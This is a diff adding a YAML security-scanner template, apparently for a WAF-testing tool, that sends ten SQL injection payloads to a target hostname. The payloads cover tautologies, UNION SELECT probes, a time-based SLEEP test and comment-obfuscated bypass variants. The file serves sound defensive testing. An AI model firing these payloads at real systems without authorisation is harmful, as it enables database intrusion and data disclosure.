@@ -1,0 +1,21 @@
+id: waf-bypass-sqli
+info:
+  name: "WAF Bypass via SQL Injection Payloads"
+  severity: "Critical"
+  description: "Tests WAF rules by sending SQL injection payloads with common WAF bypass techniques."
+  compliance:
+    owasp: "A03:2021"
+    cwe: "CWE-89"
+waf_bypass_verify:
+  - target: "{{Hostname}}"
+    payloads:
+      - "' OR '1'='1"
+      - "1' AND 1=1--"
+      - "1 UNION SELECT NULL--"
+      - "' OR 1=1#"
+      - "'/*!50000OR*/1=1--"
+      - "1' AND SLEEP(5)--"
+      - "1'/*!50000AND*/1=1--"
+      - "' OR '1'='1' --"
+      - "1' AND 1=1 UNION SELECT @@version--"
+      - "1' /*!OR*/ 1=1--"
